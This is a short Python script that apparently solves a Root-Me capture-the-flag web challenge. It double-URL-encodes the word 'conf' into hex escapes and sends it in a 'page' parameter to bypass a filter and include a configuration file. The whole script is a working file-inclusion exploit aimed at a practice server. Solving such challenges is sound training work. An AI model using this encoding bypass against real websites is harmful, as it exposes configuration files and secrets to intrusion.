import requests


url = "http://challenge01.root-me.org/web-serveur/ch45/index.php?page="

a = "conf"

answer = ""
for c in a:
    answer += hex(ord(c))
answer = answer.split('0x')

solution = ""
for c in answer:
    solution += "%25" + c
solution = solution[4:len(solution)]
solution = '%' + solution
print(solution)

r = requests.get('%s%s' % (url, solution))
print(r.text)